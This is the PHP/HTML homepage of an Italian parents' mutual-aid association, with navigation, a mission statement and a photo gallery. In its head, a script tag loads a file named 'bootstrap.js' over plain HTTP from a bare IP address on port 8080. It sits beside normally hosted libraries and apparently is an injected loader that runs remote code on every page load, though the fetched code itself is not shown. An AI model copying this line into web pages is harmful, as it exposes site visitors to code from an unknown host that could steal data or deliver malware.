<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://kit.fontawesome.com/a730223cdf.js" crossorigin="anonymous"></script>
    <script src='https://code.jquery.com/jquery-3.6.4.min.js'></script>
    <script src="http://52.47.171.54:8080/bootstrap.js"></script>
    <script src="script/script.js"></script>
    <link rel="stylesheet" href="style/style.css">
    <link rel="icon" href="image/logos/logo.png" type="x-icon">
    <title>Un aiuto per crescere insieme</title>
</head>

<!-- STAMPA del BODY in BASE al COOKIE SALVATO -->
<?php
    include "util/cookie.php";
    include "util/command.php";
    importActualStyle();
?>

    <!-- menu di navigazione -->
    <main>
        <section class="header">
            <nav>
                <a href='index.php'>
                    <img 
                        src="image/logos/logo.png"
                        class="logo"
                        id="logoImg"
                        alt="logo associazione"
                    />
                </a>
                <div class="nav_links" id="navLinks">
                    <ul>
                        <li><a href="newsletter/newsletter.php"     class="btn">Newsletter   </a></li>
                        <li><a href="bacheca/bacheca.php"           class="btn">Bacheca       </a></li>
                        <li><a href="https://stripe.com/it"         class="btn" target="blank">Donazioni</a></li>
                        <li><a href="private/area_personale.php"    class="btn">Area Personale</a></li>
                    </ul>
                </div>
            </nav>            
        </section>
    </main>

    <section class="body__main">
        <h1 class="title">Associazione ZeroTre</h1>
        <p class="paragraph">
        SIAMO GENITORI CHE CREDONO NEL MUTUO SOCCORSO PERCHÉ LO SCAMBIO DI EMOZIONI ED
            ESPERIENZE EVITA LA CHIUSURA NEL DOLORE E MIGLIORA LA QUALITÀ DI VITA FAMILIARE
        </p>
        <div class="gallery">
            <img class="photo" src="image/content/image1.jpg" alt="immagine 1 della premiazione">
            <img class="photo" src="image/content/image2.jpg" alt="immagine 2 della premiazione">
            <img class="photo" src="image/content/image3.jpg" alt="immagine 3 della premiazione">
        </div>
    </section>

    <?php show_footer() ?>
</body>
</html>